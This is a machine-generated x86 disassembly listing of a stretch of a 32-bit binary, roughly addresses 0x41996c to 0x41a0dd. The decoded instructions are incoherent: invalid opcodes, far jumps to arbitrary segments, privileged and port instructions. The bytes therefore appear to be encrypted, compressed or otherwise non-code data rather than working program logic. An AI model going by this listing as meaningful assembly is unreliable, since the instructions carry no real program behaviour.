  41996c:	sub    esp,edx
  41996e:	jp     0x419941
  419970:	aas    
  419971:	cdq    
  419972:	fadd   QWORD PTR [ebp+0x322f0455]
  419978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419979:	jecxz  0x4199b4
  41997b:	xor    al,0x18
  41997d:	(bad)  
  41997e:	mov    ebp,DWORD PTR [edi]
  419980:	retf   
  419981:	(bad)  
  419982:	pop    esi
  419983:	push   ebx
  419984:	adc    dl,ch
  419986:	aaa    
  419987:	push   ecx
  419988:	jp     0x419930
  41998a:	inc    edi
  41998b:	mov    eax,0xeef8cd25
  419990:	xchg   esi,eax
  419991:	mov    cl,0xc1
  419993:	mov    ah,0x30
  419995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419996:	cs or  al,0x3f
  419999:	sbb    BYTE PTR [edx-0x79],dl
  41999c:	inc    esp
  41999d:	xchg   esi,eax
  41999e:	jne    0x419988
  4199a0:	call   0xfbdc:0xb6adaa88
  4199a7:	fadd   QWORD PTR [ebx+0x64f74109]
  4199ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199ae:	call   0x9aad:0x9035b407
  4199b5:	add    eax,0x6f68f10e
  4199ba:	int    0x42
  4199bc:	mov    gs,WORD PTR [edi]
  4199be:	fdecstp 
  4199c0:	cwde   
  4199c1:	neg    esp
  4199c3:	addr16 xchg dl,bh
  4199c6:	(bad)  
  4199c7:	and    eax,0xec1ba4be
  4199cc:	mov    cl,0x47
  4199ce:	fstp   QWORD PTR ds:0x7cd6fc6a
  4199d4:	inc    edx
  4199d5:	jmp    0xdb18:0x7220866d
  4199dc:	sbb    BYTE PTR [ecx+0x47f59c2b],0xc9
  4199e3:	sti    
  4199e4:	call   0xe7cc4f72
  4199e9:	pop    edx
  4199ea:	rcl    DWORD PTR [edi+ebp*2+0x44d002f7],1
  4199f1:	pop    edx
  4199f2:	imul   ebx,DWORD PTR [ecx],0xb1fb6221
  4199f8:	arpl   WORD PTR [ebx],di
  4199fa:	cmp    ecx,ecx
  4199fc:	int3   
  4199fd:	test   al,0xdd
  4199ff:	mul    DWORD PTR [ecx]
  419a01:	dec    edx
  419a02:	psubb  mm0,QWORD PTR [eax+0x21]
  419a06:	fs jb  0x4199c1
  419a09:	ficom  WORD PTR [ecx]
  419a0b:	sahf   
  419a0c:	mov    ebp,0x16dd9356
  419a11:	adc    al,0xdb
  419a13:	stc    
  419a14:	push   ebx
  419a15:	add    al,0xcc
  419a17:	mul    BYTE PTR [ecx-0x4d7511f3]
  419a1d:	sub    DWORD PTR [ebx],esi
  419a1f:	xor    al,0x37
  419a21:	jle    0x4199d7
  419a23:	mov    ebp,0x6a8095ac
  419a28:	push   esi
  419a29:	xor    edx,DWORD PTR [esi+ebp*1-0x2d0b2429]
  419a30:	scas   eax,DWORD PTR es:[edi]
  419a31:	ss sbb bl,al
  419a34:	jbe    0x4199bb
  419a36:	call   0x7385c5d
  419a3b:	cmp    edx,0x23498a
  419a41:	stc    
  419a42:	xor    BYTE PTR [edx+0x53579570],0x73
  419a49:	fstp   TBYTE PTR [edi]
  419a4b:	mov    cl,0xf
  419a4d:	sbb    al,0xe3
  419a4f:	icebp  
  419a50:	out    dx,al
  419a51:	pop    edi
  419a52:	mov    ebx,0xe53643aa
  419a57:	hlt    
  419a58:	ret    0xc699
  419a5b:	add    eax,0x5e78d81c
  419a60:	pop    es
  419a61:	mov    ah,0x5
  419a63:	xchg   edi,eax
  419a64:	(bad)  
  419a65:	ja     0x419ac2
  419a67:	in     al,dx
  419a68:	pop    esi
  419a69:	ret    
  419a6a:	jge    0x419aa5
  419a6c:	jo     0x419a9e
  419a6e:	push   edx
  419a6f:	lea    edx,gs:[ebp+0x4e]
  419a73:	mov    WORD PTR [edx+0xf],?
  419a76:	(bad)  
  419a77:	arpl   WORD PTR [ecx-0x5e],cx
  419a7a:	dec    ecx
  419a7b:	jb     0x419ab6
  419a7d:	popf   
  419a7e:	ins    DWORD PTR es:[edi],dx
  419a7f:	div    BYTE PTR [ebx+0x31]
  419a82:	ds sahf 
  419a84:	leave  
  419a85:	fnstenv [edi+ebp*8+0x3a856ab8]
  419a8c:	clc    
  419a8d:	clc    
  419a8e:	loop   0x419a16
  419a90:	push   ecx
  419a91:	or     eax,0x81af6006
  419a96:	mov    cl,0xef
  419a98:	or     al,0xcf
  419a9a:	mov    eax,0x237d7247
  419a9f:	iret   
  419aa0:	test   BYTE PTR ds:[edx],bh
  419aa3:	mov    ds:0x83163d14,eax
  419aa8:	or     bh,BYTE PTR [esi+0x24]
  419aab:	clc    
  419aac:	xchg   DWORD PTR [edx+0x65],ecx
  419aaf:	adc    BYTE PTR es:[ecx],al
  419ab2:	pop    ebx
  419ab3:	daa    
  419ab4:	arpl   WORD PTR [esi+0x2a],di
  419ab7:	(bad)
  419abb:	add    eax,0x221909fd
  419ac0:	mov    eax,0x7c0089ed
  419ac5:	xchg   edi,eax
  419ac6:	test   al,0x42
  419ac8:	mov    eax,ds:0x37deb034
  419acd:	mov    al,ds:0xf18e6524
  419ad2:	iret   
  419ad3:	sub    DWORD PTR [edx+ecx*8+0x5ca19707],esp
  419ada:	mov    esp,0x44e82c9c
  419adf:	fsubp  st(1),st
  419ae1:	in     al,dx
  419ae2:	sti    
  419ae3:	sub    edx,0xb74ae552
  419ae9:	add    eax,DWORD PTR [ecx]
  419aeb:	std    
  419aec:	adc    eax,0x7257bc58
  419af1:	inc    edx
  419af2:	push   0xfffffff9
  419af4:	data16 int 0x62
  419af7:	push   ss
  419af8:	lods   eax,DWORD PTR ds:[esi]
  419af9:	mov    ah,0x64
  419afb:	jnp    0x419ac3
  419afd:	and    eax,0x97abd3d7
  419b02:	stos   DWORD PTR es:[edi],eax
  419b03:	test   DWORD PTR [ebp-0x9],eax
  419b06:	mov    dl,0xdf
  419b08:	js     0x419b31
  419b0a:	cmp    ch,BYTE PTR [ebx+0x72]
  419b0d:	xchg   dh,ah
  419b0f:	xor    BYTE PTR [esi-0x27571a8d],dl
  419b15:	push   esp
  419b16:	clc    
  419b17:	cli    
  419b18:	daa    
  419b19:	nop
  419b1a:	cmp    esp,DWORD PTR [edi]
  419b1c:	sub    ah,al
  419b1e:	and    edx,DWORD PTR [edi]
  419b20:	and    BYTE PTR [edi+0x1b],0x24
  419b24:	fnstenv ds:0x67a9affb
  419b2a:	xchg   ecx,eax
  419b2b:	pop    esi
  419b2c:	int3   
  419b2d:	dec    edi
  419b2e:	mov    esp,0x83b9e5c8
  419b33:	push   eax
  419b34:	xchg   ecx,eax
  419b35:	call   0x922d:0x38200d23
  419b3c:	rol    eax,0x35
  419b3f:	dec    ebp
  419b40:	out    dx,eax
  419b41:	mov    esp,DWORD PTR [eax+0x1f85fa63]
  419b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b48:	add    esp,eax
  419b4a:	adc    al,0xa2
  419b4c:	jo     0x419b0e
  419b4e:	xor    al,0x82
  419b50:	inc    ebp
  419b51:	aam    0x90
  419b53:	mov    ah,0x43
  419b55:	hlt    
  419b56:	push   ds
  419b57:	sbb    BYTE PTR [ebx-0x2c],al
  419b5a:	push   ecx
  419b5b:	xchg   edx,eax
  419b5c:	cmp    ebp,ebp
  419b5e:	sub    al,BYTE PTR [ebp-0x4e]
  419b61:	imul   eax,DWORD PTR [ebp-0x75],0xffffffa4
  419b65:	pop    esi
  419b66:	mov    BYTE PTR [edx+edi*8+0x13698ae5],bl
  419b6d:	fwait
  419b6e:	dec    ebp
  419b6f:	push   esp
  419b70:	push   edi
  419b71:	mov    dl,0x70
  419b73:	leave  
  419b74:	neg    BYTE PTR [esi+0x40]
  419b77:	add    cl,BYTE PTR [ebp+0x4d]
  419b7a:	ins    DWORD PTR es:[edi],dx
  419b7b:	outs   dx,BYTE PTR ds:[esi]
  419b7c:	push   DWORD PTR [edi-0x7f69023b]
  419b82:	sbb    BYTE PTR [edx+0x3384f407],ch
  419b88:	dec    edx
  419b89:	shl    DWORD PTR [eax+ebx*1],0xc7
  419b8d:	mov    ?,WORD PTR [edx-0x36bd0f0a]
  419b93:	pop    ebp
  419b94:	cmp    eax,0x4a3c5d6b
  419b99:	push   ecx
  419b9a:	fdivp  st(4),st
  419b9c:	and    cl,bh
  419b9e:	ins    DWORD PTR es:[edi],dx
  419b9f:	adc    DWORD PTR [edx-0x13],eax
  419ba2:	ins    BYTE PTR es:[edi],dx
  419ba3:	dec    ecx
  419ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ba5:	push   esp
  419ba6:	dec    eax
  419ba7:	jp     0x419bc0
  419ba9:	call   0x9e9d:0xb1af62d7
  419bb0:	ret    0xfc3f
  419bb3:	adc    edi,ecx
  419bb5:	push   ebp
  419bb6:	or     DWORD PTR [ebp-0x58986270],edi
  419bbc:	add    esp,DWORD PTR [eax-0x68]
  419bbf:	repz sar DWORD PTR [ebp-0x2],0x9c
  419bc4:	jl     0x419b9f
  419bc6:	and    DWORD PTR [eax+0x53],ecx
  419bc9:	sub    al,0x87
  419bcb:	test   DWORD PTR [ecx],esp
  419bcd:	loop   0x419c42
  419bcf:	in     al,0xbf
  419bd1:	dec    edx
  419bd2:	imul   ebx,eax,0x2d
  419bd5:	pop    eax
  419bd6:	sbb    al,0xaf
  419bd8:	loope  0x419c0f
  419bda:	mov    dl,0x99
  419bdc:	cmp    al,0x54
  419bde:	fcom   QWORD PTR [ecx-0x3e]
  419be1:	mov    ds:0x2824c84b,al
  419be7:	adc    ecx,DWORD PTR [esi+0x5d]
  419bea:	in     eax,0x6d
  419bec:	jl     0x419c6a
  419bee:	fadd   QWORD PTR [esi-0x4292b6ad]
  419bf4:	inc    BYTE PTR [ebp-0x3a5f8812]
  419bfa:	push   0xffffffb3
  419bfc:	cmp    edi,DWORD PTR [ebx]
  419bfe:	dec    esi
  419bff:	xor    esp,DWORD PTR [edx]
  419c01:	shr    ah,1
  419c03:	jnp    0x419c6b
  419c05:	xchg   ebp,eax
  419c06:	test   al,0x17
  419c09:	or     BYTE PTR [ebx-0xa],ah
  419c0c:	mov    ?,WORD PTR [ebx+0x57]
  419c0f:	adc    esi,DWORD PTR [edi]
  419c11:	mov    eax,ds:0x76f76853
  419c16:	push   eax
  419c17:	sti    
  419c18:	push   ebx
  419c19:	sbb    dl,BYTE PTR [eax-0x1e]
  419c1c:	cli    
  419c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c1e:	adc    eax,0x885c8bcf
  419c23:	(bad)  
  419c24:	jno    0x419bdf
  419c26:	add    eax,0xa6f07f37
  419c2b:	rol    DWORD PTR [esi-0x71],0x5f
  419c2f:	cmp    edi,DWORD PTR [ecx+0x388c484e]
  419c35:	loope  0x419c9f
  419c37:	push   ebx
  419c38:	xor    eax,0x13fa0aa2
  419c3d:	call   0xada393b5
  419c42:	xlat   BYTE PTR ds:[ebx]
  419c43:	mul    esp
  419c45:	dec    ebx
  419c46:	scas   eax,DWORD PTR es:[edi]
  419c47:	and    bh,BYTE PTR [esi]
  419c49:	mov    ebx,ebp
  419c4b:	test   eax,0xe2a25cb8
  419c50:	(bad)  
  419c52:	inc    ebx
  419c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c54:	or     ah,BYTE PTR [esi]
  419c56:	push   esi
  419c57:	dec    ebp
  419c58:	pop    ebx
  419c59:	pusha  
  419c5a:	lods   al,BYTE PTR ds:[esi]
  419c5b:	cmc    
  419c5c:	adc    DWORD PTR [esi-0xb9bca1f],esp
  419c62:	pop    ss
  419c63:	shr    DWORD PTR [edi-0x7c8d2f5c],1
  419c69:	scas   al,BYTE PTR es:[edi]
  419c6a:	(bad)  
  419c6b:	(bad)  
  419c6c:	retf   
  419c6d:	and    dh,dh
  419c6f:	sti    
  419c70:	add    DWORD PTR [esi-0x1729d478],esi
  419c76:	mov    edx,0x7f64702
  419c7b:	mov    al,0x57
  419c7d:	call   0x11c609f3
  419c82:	push   ebx
  419c83:	in     eax,0xf1
  419c85:	inc    edi
  419c86:	mov    eax,ds:0x9d7cc941
  419c8b:	xor    eax,0x57c73372
  419c90:	int3   
  419c91:	shl    DWORD PTR [edx],cl
  419c93:	xchg   esi,eax
  419c94:	dec    ecx
  419c95:	push   esp
  419c96:	and    al,0x7e
  419c98:	jg     0x419cb2
  419c9a:	ja     0x419ce6
  419c9c:	fstp   QWORD PTR [esi]
  419c9e:	dec    ecx
  419c9f:	sbb    esi,DWORD PTR [bx+si-0x7b2f]
  419ca4:	sub    al,0xad
  419ca6:	mov    ebp,0xc55eb959
  419cab:	pushaw 
  419cad:	lods   al,BYTE PTR ds:[esi]
  419cae:	jmp    0x419c8d
  419cb0:	xchg   ecx,eax
  419cb1:	mov    WORD PTR [edx-0x7a],cs
  419cb4:	add    eax,DWORD PTR [esp+ebx*1]
  419cb7:	adc    DWORD PTR [edi-0x5],0xb33ef451
  419cbe:	outs   dx,DWORD PTR ds:[esi]
  419cbf:	retf   
  419cc0:	icebp  
  419cc1:	mov    ebp,DWORD PTR [ecx-0x6a313f0c]
  419cc7:	jg     0x419d07
  419cc9:	jl     0x419cb6
  419ccb:	xchg   edx,eax
  419ccc:	mov    bh,0xb2
  419cce:	push   ss
  419ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cd0:	in     eax,dx
  419cd1:	js     0x419cc0
  419cd3:	aad    0xc2
  419cd5:	xchg   esi,eax
  419cd6:	ret    
  419cd7:	in     eax,dx
  419cd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cd9:	pop    ecx
  419cda:	dec    ecx
  419cdb:	out    dx,eax
  419cdc:	rcl    BYTE PTR [ebx-0x16],0x5e
  419ce0:	fnstcw WORD PTR [ebx-0x3207d971]
  419ce6:	push   ebp
  419ce7:	jmp    0x145b:0x8c1ab1da
  419cee:	push   bx
  419cf0:	sahf   
  419cf1:	mov    ebx,0xcb8c7db8
  419cf6:	jo     0x419d5a
  419cf8:	mov    ds:0x596e543e,al
  419cfd:	mov    ds:0xc1e102fd,al
  419d02:	adc    dl,BYTE PTR [ebp-0x34744d53]
  419d08:	popf   
  419d09:	xor    dh,bh
  419d0b:	sub    al,0x83
  419d0d:	adc    BYTE PTR [eax+0x3c],bl
  419d10:	xchg   edx,eax
  419d11:	test   DWORD PTR [edi+0x5ea78578],eax
  419d17:	out    0x98,al
  419d19:	data16 cs loopne 0x419cec
  419d1d:	xchg   ecx,eax
  419d1e:	cld    
  419d1f:	out    dx,eax
  419d20:	cld    
  419d21:	sbb    DWORD PTR [edi],ebp
  419d23:	repnz ins DWORD PTR es:[edi],dx
  419d25:	adc    DWORD PTR [ecx],ecx
  419d27:	not    ebx
  419d29:	jp     0x419d0c
  419d2b:	test   DWORD PTR [edi+0x41],ebp
  419d2e:	int    0xf4
  419d30:	add    dh,BYTE PTR [ecx-0x675e0990]
  419d36:	mov    bl,0x41
  419d38:	call   0x2f100eb3
  419d3d:	hlt    
  419d3e:	lahf   
  419d3f:	ins    DWORD PTR es:[edi],dx
  419d40:	xor    BYTE PTR [edx],cl
  419d42:	dec    esp
  419d43:	jg     0x419d68
  419d45:	dec    ebx
  419d46:	jmp    0xf5ceaa75
  419d4b:	and    al,0xc6
  419d4d:	xchg   esp,eax
  419d4e:	jo     0x419d19
  419d50:	mov    edx,0x5453180
  419d55:	jmp    0x419d80
  419d57:	jl     0x419d9e
  419d59:	sti    
  419d5a:	je     0x419cde
  419d5c:	loopne 0x419da2
  419d5e:	(bad)  
  419d5f:	aad    0x55
  419d61:	xor    al,0xba
  419d63:	dec    ebp
  419d64:	out    dx,al
  419d65:	fistp  DWORD PTR [ebp-0xb]
  419d68:	pop    es
  419d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d6a:	fidivr DWORD PTR ds:[eax+0x4c86a765]
  419d71:	xor    DWORD PTR [eax-0x5a6d1b25],ebp
  419d77:	sbb    eax,DWORD PTR [esi]
  419d79:	add    al,0x40
  419d7b:	mov    ecx,0x50d083c4
  419d80:	add    dh,BYTE PTR [esi-0x3d]
  419d83:	fwait
  419d84:	daa    
  419d85:	cmp    eax,0xf54087f5
  419d8a:	lods   al,BYTE PTR ds:[esi]
  419d8b:	sbb    ecx,DWORD PTR [eax+0xf]
  419d8e:	push   ss
  419d8f:	out    0x47,al
  419d91:	ins    BYTE PTR es:[edi],dx
  419d92:	inc    BYTE PTR [ebx+0x10725d1e]
  419d98:	mov    bl,0x22
  419d9a:	das    
  419d9b:	psubsw mm1,QWORD PTR [esi]
  419d9e:	outs   dx,DWORD PTR ds:[esi]
  419d9f:	mov    ds:0x52de19d1,eax
  419da4:	fcomp  DWORD PTR [eax-0x26]
  419da7:	fnsave [ebp+0x56a5d4d4]
  419dad:	int    0x36
  419daf:	loopne 0x419d9e
  419db1:	push   ss
  419db2:	ja     0x419d44
  419db4:	lock js 0x419daf
  419db7:	xor    ch,BYTE PTR [ebx]
  419db9:	sahf   
  419dba:	inc    edx
  419dbb:	loopne 0x419d85
  419dbd:	xor    DWORD PTR [eax],edx
  419dbf:	xor    ch,dh
  419dc1:	mov    WORD PTR [edi*4-0x7eb2725b],fs
  419dc8:	jmp    0xd767:0x5333744a
  419dcf:	xchg   edi,eax
  419dd0:	aam    0x5f
  419dd2:	stc    
  419dd3:	inc    eax
  419dd4:	xchg   ecx,eax
  419dd5:	ret    0xfef9
  419dd8:	or     eax,0xba60c0a9
  419ddd:	mov    dl,0x90
  419ddf:	sub    BYTE PTR [esi-0x35],ah
  419de2:	xor    eax,DWORD PTR [edi]
  419de4:	sub    eax,0xe56ca2e4
  419de9:	adc    eax,0x7e2266c0
  419dee:	xor    eax,0x103fc446
  419df3:	xchg   esp,eax
  419df4:	pop    edx
  419df5:	es ins DWORD PTR es:[edi],dx
  419df7:	daa    
  419df8:	adc    BYTE PTR [ecx+0x5badaf41],cl
  419dfe:	and    ebp,DWORD PTR [ebx]
  419e00:	cmp    eax,0xda4c055
  419e05:	add    BYTE PTR [esi],0x42
  419e08:	(bad)  
  419e09:	idiv   BYTE PTR [ebp-0x4]
  419e0c:	adc    al,0xdc
  419e0e:	dec    ebx
  419e0f:	sbb    BYTE PTR [ebx+0x77],dh
  419e12:	mov    DWORD PTR [ebp-0x74],esi
  419e15:	addr16 mov edx,0xa1cf4a13
  419e1b:	add    eax,0x72bd553
  419e20:	stc    
  419e21:	sub    eax,0x79f7aabd
  419e26:	add    eax,0xc37e020c
  419e2c:	xlat   BYTE PTR ds:[ebx]
  419e2d:	(bad)  
  419e2e:	retf   
  419e2f:	cmp    DWORD PTR ss:[edx-0x7],ebp
  419e33:	loope  0x419ddc
  419e35:	adc    ebp,DWORD PTR [edi+0x65]
  419e38:	cmp    bh,BYTE PTR [edi]
  419e3a:	xchg   ebp,eax
  419e3b:	jb     0x419e8c
  419e3d:	mov    cl,0xc5
  419e3f:	inc    ecx
  419e40:	mov    bh,ch
  419e42:	loope  0x419e4b
  419e44:	mov    esp,0xc953ee5a
  419e49:	push   esp
  419e4a:	xchg   edx,eax
  419e4b:	jmp    FWORD PTR [ebx+0x283fc9f6]
  419e51:	adc    BYTE PTR [ebp-0x5fb489c0],al
  419e57:	fwait
  419e58:	mov    esp,0x8e6936ac
  419e5d:	mov    ch,0xde
  419e5f:	gs mov ebp,0x195ced2
  419e65:	je     0x419e20
  419e67:	jge    0x419e8c
  419e69:	jns    0x419e27
  419e6b:	in     eax,dx
  419e6c:	jns    0x419e0b
  419e6e:	dec    esi
  419e6f:	sbb    DWORD PTR [edx],eax
  419e71:	jae    0x419e74
  419e73:	pop    ds
  419e74:	popa   
  419e75:	adc    eax,DWORD PTR [edx]
  419e77:	jne    0x419e4e
  419e79:	push   ss
  419e7a:	ss ret 0x9c7e
  419e7e:	cs test eax,0x3d4e5df2
  419e84:	test   DWORD PTR [ecx-0x39cbcd4b],edi
  419e8a:	dec    esp
  419e8b:	or     ecx,ebx
  419e8d:	test   eax,0x8882fb47
  419e92:	jbe    0x419e64
  419e94:	xchg   ebp,eax
  419e95:	ins    DWORD PTR es:[edi],dx
  419e96:	push   ebp
  419e97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e98:	sbb    edi,DWORD PTR [esi]
  419e9a:	repz popa 
  419e9c:	iret   
  419e9d:	pop    ebp
  419e9e:	push   edi
  419e9f:	pop    esi
  419ea0:	jbe    0x419e40
  419ea2:	cli    
  419ea3:	sub    al,0x2c
  419ea5:	inc    ebp
  419ea6:	xchg   edi,eax
  419ea7:	xor    ebp,DWORD PTR [esi+0x7b7f3091]
  419ead:	adc    al,0xd6
  419eaf:	mov    esi,0xbc3f755a
  419eb4:	push   es
  419eb5:	inc    ebp
  419eb6:	es push esp
  419eb8:	push   cs
  419eb9:	inc    ebx
  419eba:	pop    eax
  419ebb:	and    eax,0x5fee9254
  419ec0:	cmp    esi,DWORD PTR [ebp+edi*2+0x40]
  419ec4:	(bad)  
  419ec5:	in     eax,dx
  419ec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ec7:	pop    ecx
  419ec8:	stos   DWORD PTR es:[edi],eax
  419ec9:	xchg   ebx,eax
  419eca:	jbe    0x419e82
  419ecc:	arpl   WORD PTR [ebp-0x66],dx
  419ecf:	fwait
  419ed0:	iret   
  419ed1:	aaa    
  419ed2:	mov    ds:0x2191e549,al
  419ed7:	jae    0x419f41
  419ed9:	ins    BYTE PTR es:[edi],dx
  419eda:	mov    cl,0x6c
  419edc:	pop    ebx
  419edd:	pop    ss
  419ede:	fimul  WORD PTR [esi-0x73]
  419ee1:	mov    edi,0xe2799f4e
  419ee6:	test   al,0xbf
  419ee8:	mov    edx,0xfaae4fed
  419eed:	push   0xffffff94
  419eef:	jmp    0x419f70
  419ef1:	mov    dh,BYTE PTR [ecx]
  419ef3:	out    dx,eax
  419ef4:	dec    ebp
  419ef5:	mov    bh,0xcb
  419ef7:	jae    0x419e93
  419ef9:	fwait
  419efa:	xchg   DWORD PTR [ecx-0x1b],esp
  419efd:	mov    esi,0xf310c762
  419f02:	mov    dl,0x92
  419f04:	(bad)  
  419f05:	jmp    0x419f06
  419f07:	pop    ebp
  419f08:	loope  0x419ef9
  419f0a:	dec    eax
  419f0b:	jl     0x419ef1
  419f0d:	push   ds
  419f0e:	(bad)  
  419f10:	jne    0x419f73
  419f12:	test   DWORD PTR [edx-0xc95def2],0xb1088b44
  419f1c:	xor    BYTE PTR ds:0x243f801d,0xe4
  419f23:	call   0xa76f:0x991be347
  419f2a:	push   cs
  419f2b:	loope  0x419eff
  419f2d:	adc    ah,BYTE PTR [esi+0x3]
  419f30:	js     0x419f95
  419f32:	mov    cl,0x49
  419f34:	jo     0x419eb6
  419f36:	push   edi
  419f37:	push   ebp
  419f38:	cmp    al,0x5d
  419f3a:	pop    esp
  419f3b:	les    ebp,FWORD PTR [ecx]
  419f3d:	in     eax,0xbb
  419f3f:	mov    ds:0x22273d53,eax
  419f44:	sbb    DWORD PTR [edi+0x11],edi
  419f47:	sub    edi,DWORD PTR [ecx]
  419f49:	jnp    0x419eeb
  419f4b:	push   esi
  419f4c:	in     eax,0xac
  419f4e:	push   cs
  419f4f:	mov    ds:0xc3cd4680,al
  419f54:	mov    ebx,0x87763a58
  419f59:	mov    al,0xdf
  419f5b:	jb     0x419f51
  419f5d:	std    
  419f5e:	push   es
  419f5f:	rcl    esp,0x32
  419f62:	mov    ah,0xae
  419f64:	setnp  cl
  419f67:	pop    ebx
  419f68:	mov    ds:0xa003bb43,eax
  419f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f6e:	je     0x419f15
  419f70:	mov    al,ds:0x3074c433
  419f75:	jg     0x419fc2
  419f77:	enter  0x3639,0xad
  419f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f7c:	popf   
  419f7d:	add    eax,0x908c737c
  419f82:	test   DWORD PTR [esi-0x7611eaa7],edx
  419f88:	repz ds mov bl,0x30
  419f8c:	mov    bl,0xc0
  419f8e:	in     eax,dx
  419f8f:	pop    ebp
  419f90:	adc    BYTE PTR [ebp+0x282d8bdb],0x8f
  419f97:	and    eax,0x50468ee6
  419f9c:	mov    dl,0x9b
  419f9e:	push   eax
  419f9f:	icebp  
  419fa0:	ret    0xc2ef
  419fa3:	aaa    
  419fa4:	pop    esi
  419fa5:	aam    0xb8
  419fa7:	imul   ecx,DWORD PTR [ebx],0xffffffd5
  419faa:	test   al,0x6a
  419fac:	xchg   ebx,eax
  419fad:	mov    esi,0x497a710c
  419fb2:	int3   
  419fb3:	pop    ecx
  419fb4:	cmc    
  419fb5:	jecxz  0x419ff0
  419fb7:	lods   al,BYTE PTR ds:[esi]
  419fb8:	enter  0xbaad,0x74
  419fbc:	out    dx,eax
  419fbd:	push   ecx
  419fbe:	xchg   ebp,eax
  419fbf:	add    BYTE PTR [edx-0x58],0x90
  419fc3:	and    al,0xb9
  419fc5:	icebp  
  419fc6:	inc    edx
  419fc7:	lds    esi,FWORD PTR [edi+0x69]
  419fca:	mov    dl,0xbe
  419fcc:	jnp    0x419fc9
  419fce:	cmp    ebp,0x9d51fb2e
  419fd4:	mov    bl,0x18
  419fd6:	pop    esi
  419fd7:	inc    edx
  419fd8:	mov    ch,0x20
  419fda:	xchg   DWORD PTR [ecx-0x19],ecx
  419fdd:	push   ss
  419fde:	jo     0x41a01a
  419fe0:	jl     0x419f63
  419fe2:	jae    0x41a039
  419fe4:	mov    DWORD PTR [ebp-0x8],ebp
  419fe7:	pop    eax
  419fe8:	outs   dx,DWORD PTR ds:[esi]
  419fe9:	adc    al,0x82
  419feb:	mov    bh,0xd
  419fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fee:	dec    edx
  419fef:	adc    DWORD PTR [eax+0x8a6f90a],esi
  419ff5:	aas    
  419ff6:	and    al,0xd6
  419ff8:	retf   
  419ff9:	loopne 0x41a013
  419ffb:	jno    0x419fb1
  419ffd:	mov    ebp,0x70ded605
  41a002:	stos   BYTE PTR es:[edi],al
  41a003:	call   0xf2c50dae
  41a008:	xchg   ebp,eax
  41a009:	fnstcw WORD PTR [edx+0x74]
  41a00c:	xor    al,0x58
  41a00e:	pushf  
  41a00f:	mov    al,ds:0xe4913619
  41a014:	jo     0x41a060
  41a016:	inc    edi
  41a017:	pop    ebp
  41a018:	sbb    BYTE PTR [eax+0x51],al
  41a01b:	pop    eax
  41a01c:	jl     0x41a05d
  41a01e:	xor    DWORD PTR [ebx+ecx*4-0x6f],0xffffffae
  41a023:	ja     0x41a06f
  41a025:	shl    DWORD PTR [edi-0x21],1
  41a028:	pusha  
  41a029:	inc    esp
  41a02a:	dec    ecx
  41a02b:	ja     0x41a018
  41a02d:	xlat   BYTE PTR ds:[ebx]
  41a02e:	cld    
  41a02f:	add    eax,edi
  41a031:	inc    ebp
  41a032:	dec    edx
  41a033:	cdq    
  41a034:	or     ah,BYTE PTR [ebp-0x5f]
  41a037:	cdq    
  41a038:	and    BYTE PTR [edx+0x48c62450],ah
  41a03e:	fcompp 
  41a040:	ss dec ebx
  41a042:	and    edx,DWORD PTR [edi+0x5e]
  41a045:	in     al,dx
  41a046:	stos   BYTE PTR es:[edi],al
  41a047:	adc    eax,0xf88e6e62
  41a04c:	pop    es
  41a04d:	cmp    ecx,DWORD PTR [esi-0x14]
  41a050:	shl    bl,cl
  41a052:	int3   
  41a053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a054:	sbb    edi,DWORD PTR [ebx-0x29e7a397]
  41a05a:	out    dx,eax
  41a05b:	nop
  41a05c:	test   eax,0x9508ec94
  41a061:	sahf   
  41a062:	(bad)  
  41a064:	push   cs
  41a065:	sub    BYTE PTR [edx+0x68c25e66],0xfd
  41a06c:	mov    esp,0x1ab6a80e
  41a071:	cmp    esi,DWORD PTR [ebp+0xc2d21b0]
  41a077:	addr16 ds mov dl,0x3
  41a07b:	gs inc edi
  41a07d:	addr16 dec esp
  41a07f:	fisttp QWORD PTR [eax-0xf6a882c]
  41a085:	pop    ebp
  41a086:	in     eax,0x4b
  41a088:	inc    ecx
  41a089:	lods   al,BYTE PTR ds:[esi]
  41a08a:	mov    ecx,0xe972a063
  41a08f:	retf   0x9290
  41a092:	fsubr  QWORD PTR [edx+0x6b]
  41a095:	pop    esi
  41a096:	into   
  41a097:	cmp    DWORD PTR [eax],esi
  41a099:	jns    0x41a118
  41a09b:	sbb    al,BYTE PTR [eax+edi*4-0xa]
  41a09f:	inc    edx
  41a0a0:	or     ebx,DWORD PTR [eax+ebp*2]
  41a0a3:	pushf  
  41a0a4:	mov    esp,0xc8f299a2
  41a0a9:	leave  
  41a0aa:	add    eax,0xeb4b4e4
  41a0af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0b0:	pop    edi
  41a0b1:	outs   dx,BYTE PTR ds:[esi]
  41a0b2:	stc    
  41a0b3:	inc    eax
  41a0b4:	and    al,0x42
  41a0b6:	push   ebp
  41a0b7:	test   DWORD PTR [edx+0x21],edi
  41a0ba:	adc    eax,0x6f903e4c
  41a0bf:	dec    eax
  41a0c0:	test   DWORD PTR [ebp+0x21],esp
  41a0c3:	fisttp WORD PTR cs:[ecx]
  41a0c6:	pusha  
  41a0c7:	sub    BYTE PTR [edx],cl
  41a0c9:	loope  0x41a0cb
  41a0cb:	mov    eax,0x9cc6d9ba
  41a0d0:	bswap  esp
  41a0d2:	shr    esi,cl
  41a0d4:	add    ebx,ebp
  41a0d6:	lock fsub st(7),st
  41a0d9:	xor    DWORD PTR [esi+0x36],ebx
  41a0dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0dd:	(bad)  
